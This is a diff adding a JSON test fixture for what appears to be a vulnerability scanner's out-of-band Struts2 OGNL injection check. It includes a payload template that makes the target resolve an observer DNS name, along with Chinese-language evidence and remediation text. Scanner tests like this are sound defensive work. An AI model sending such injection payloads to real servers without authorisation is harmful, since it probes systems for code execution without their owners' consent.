@@ -1,0 +1,17 @@
+{
+  "engine": "framework_zero_day_engines._run_oob_scan",
+  "kwargs": {
+    "engine_name": "struts2_ognl",
+    "url": "https://target.example/showcase.action",
+    "param": "x",
+    "parsed_query": "x=1",
+    "payload_templates": [
+      "%{#a=@java.net.InetAddress@getByName(\"{OBS_DNS}\")}"
+    ],
+    "type_label": "Struts2 OGNL 执行",
+    "evidence_note": "注入 OGNL 静态方法触发 DNS 解析后命中 OOB(证明 OGNL 被服务端执行)",
+    "recommendation": "升级 Struts2 至官方安全版本(修复 S2-xxx)",
+    "oob_wait": 1
+  },
+  "expected": {"not_none": true, "type": "Struts2 OGNL 执行(带外实锤)"}
+}
